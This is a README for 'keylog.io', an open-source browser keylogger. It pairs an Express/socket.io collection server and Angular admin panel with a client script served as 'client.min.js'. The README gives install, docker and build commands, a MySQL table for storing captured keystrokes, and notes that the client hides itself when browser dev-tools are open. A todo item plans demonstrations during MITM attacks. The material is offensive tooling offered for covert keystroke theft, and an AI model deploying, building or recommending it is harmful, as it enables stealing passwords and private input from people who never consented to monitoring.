# keylog.io

> A express/socketio keylogger server with administrator interface

![Admin Interface](screenshot.png)

### Backend
The backend consist of an [expressjs](https://expressjs.com/) webserver which serves the administrator interface using __Basic HTTP Authentication__ customizable from the options and a [socket.io](https://socket.io/) server wait and handle the receiving of key logs from various sources, stores them and forward them to the administrator interface for be seen and analyzed.

### Interface
The administrator interface for visualize the key logs archive and the live key logs feed from various clients is built with Angular using [Angular CLI](https://github.com/angular/angular-cli) version 1.6.6. The administrator interface comes with a basic HTTP authorization which defaults to: `keylog-io`

### Client script
The client script is a socketio.io client with key logger functions that try to hide himself by pausing when the dev-tools (inspector) is open. It catches only relevant keys and send them back to the server as a buffer with additional information, take a look at the [code](lib/client.js) if you want to see more.

## Installation

This project comes in three different ways, you can use it as a node module, as a command (globally installed package) or through the official docker image.

#### As a node module

First install the module locally using your favourite package manager:

```
npm install keylog.io
yarn add keylog.io
```

Than you can start it manually in your code when you need it:

```js
import keyloggerServer from 'keylog.io'

keyloggerServer({
  serveDemo: true,
  serveClient: true
});
```

#### As a command

Install it as global package using your favorite package manager:

```
npm install -g keylog.io
yarn global add keylog.io
```

Once has been installed you can access it through the command `keylog-io` like the example below:

```
$ keylog-io --help

  Usage: keylog-io [options] [command]

  A express/socketio keylogger server with administrator interface

  Options:

    -V, --version  output the version number
    -h, --help     output usage information

  Commands:

    start [options]                    Start the keylogger server
    build [options] <hostname> [port]  Build the client flle for the given endpoint
```

You can also print the usage information for the sub commands, for example `keylog-io start --help` will print the `start` command usage informations.

#### As a docker container

Pull the official image from the docker hub:

```
docker pull b4dnewz/keylog-io
```

Than run it with some options to bind the port to your host:

```
docker run -it --rm -p 3000:3000 b4dnewz/keylog-io
```

You can now access it via http://localhost:3000 and you should be able to access the administrator interface.

If you want to further customize the execution you can set environment variables to enable/disable features:

```
docker run -d --name keylogger -p 3000:3000 -e SERVECLIENT=true b4dnewz/keylog-io
```

Here a list of all the available environment variables that will be forwarded to the module execution:

* __SERVECLIENT__: Serve the keylogger client accessible at `hostname:port/client.min.js`
* __SERVEDEMO__: Serve a demo page accessible on `hostname:port/demo`
* __DBUSER__: The database user name
* __DBPASS__: The database user password
* __DBNAME__: The database name where store the data


By default the administrator interface will have __Basic HTTP Authentication__ with values: `keylog-io`

## Options

For a full list of options see the [default](lib/index.js#L27-L49) options on source code.

## Database

If you want to __persist the keylog entries__ across time or for using the archive page to analyze your findings later or using the filters and more, you must have a __working MySQL instance__ and tell to keylog.io to use it.

It will create automatically a table called __keylogs__ where it will store all the received keylogs from clients. You can customize the database connection options such as database name using the `database.name` option or more in general the `database` option object when starting the server.

#### Table structure

The default table structure created is the following but you can customize it later using a mysql client or suggest me a better structure using the [issues](issues) section of this project.

```sql
CREATE TABLE IF NOT EXISTS `keylogs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `hostname` varchar(50) NOT NULL,
  `element` varchar(50) NOT NULL,
  `key` varchar(50) NOT NULL,
  `path` varchar(255) NOT NULL,
  `timestamp` timestamp NOT NULL DEFAULT current_timestamp(),
  KEY (`id`),
  INDEX `HOSTNAME_INDEX` (`hostname`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
```

You can also link a database using [docker links](https://docs.docker.com/network/links/) if you are using __keylog.io__ from a container.

## Todo

- [x] Basic HTTP Authentication for administrator interface with options for username and password
- [x] Optionally save key logs results on a MySQL database
- [x] Change behavior, pausing and trying to hide when devtools is open
- [x] Create different routes for live feeds and archive
- [x] Handle mobile input events (mobile browsers support)
- [x] Automatic database table setup when using database mode
- [ ] Test key logger performances with multiple different hosts
- [ ] Complete the administrator interface with filters, groups, labels and stuff..
- [ ] Write a good documentation with examples and video use during simulated MITM attacks
- [ ] Write tests for backend and frontend code
- [ ] Get drunk at the end of all this

---

## Development

Run `npm run start` this will concurrently spin up the express/socketio development server and start angular-cli. It should open a browser page with the administrator interface, if not, vavigate to `http://localhost:4200/`. The app will automatically reload if you change any of the source files.

Also it will serve a __keylogger client__ demo page at the address: `http://localhost:3000/demo/`

### Code scaffolding

Run `ng generate component component-name` to generate a new component. You can also use `ng generate directive|pipe|service|class|guard|interface|enum|module`.

### Build

Run `npm run build` to build the project. The build artifacts will be stored in the `dist/` directory. Use the `-prod` flag for a production build.

Run `npm run build-client` to build the key logger-client file which is a socket.io-client module with a payload for capturing key presses and send them to a remote server.

### Running unit tests

Run `npm run test` to execute the unit tests via [Karma](https://karma-runner.github.io).

### Running end-to-end tests

Run `npm run e2e` to execute the end-to-end tests via [Protractor](http://www.protractortest.org/).

### Further help

To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI README](https://github.com/angular/angular-cli/blob/master/README.md).
